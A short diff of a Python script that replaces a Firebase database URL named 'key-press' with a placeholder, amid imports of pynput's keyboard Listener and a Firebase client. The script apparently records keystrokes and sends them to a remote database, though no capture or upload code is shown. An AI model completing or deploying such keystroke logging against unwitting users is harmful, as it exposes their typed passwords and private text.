@@ -2,7 +2,7 @@
 import sys
 import time
 from firebase import firebase
-dbase = 'https://key-press.firebaseio.com/'
+dbase = 'https://database_name.firebaseio.com/'
 firebase = firebase.FirebaseApplication( dbase, None)
 from pynput.keyboard import Key, Listener
 
